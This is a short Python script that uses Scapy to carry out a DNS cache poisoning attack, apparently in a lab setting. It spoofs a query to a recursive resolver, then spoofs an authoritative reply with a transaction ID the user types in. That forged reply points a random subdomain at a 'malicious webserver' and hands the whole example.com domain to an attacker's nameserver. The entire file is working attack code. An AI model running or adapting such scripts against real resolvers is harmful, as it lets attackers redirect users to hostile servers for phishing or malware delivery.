#!/usr/bin/python3

from scapy.all import *
import random
import string

MALICIOUS_WEBSERVER = '1.1.1.3'
MALICIOUS_NS = 'ns.attacker.com'
ATTACKING_DOMAIN = 'example.com'
AUTHORITATIVE_DNS = '2.2.2.254'
RECURSIVE_DNS = '192.168.1.254'
VICTIM_IP = '192.168.1.2'

ip = IP(dst=RECURSIVE_DNS, src=VICTIM_IP)
udp = UDP(dport=53, sport=random.randint(1024, 65535))
transid = 1

name = ''.join(random.choices(string.ascii_letters, k=5)) + ".example.com"

qd = DNSQR(qname=name)

send(ip/udp/DNS(id=0xAAAA, rd=1, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qd))

ip = IP(dst=RECURSIVE_DNS, src=AUTHORITATIVE_DNS)
udp = UDP(dport=33333, sport=53)

anssec = DNSRR(rrname=name, type='A', rdata=MALICIOUS_WEBSERVER, ttl=259200)
nssec = DNSRR(rrname=ATTACKING_DOMAIN, type='NS', rdata=MALICIOUS_NS, ttl=259200)

query_id = int(input("Enter the query id: "))
send(ip/udp/DNS(id=query_id, aa=1, ra=0, rd=0, cd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=qd, an=anssec, ns=nssec))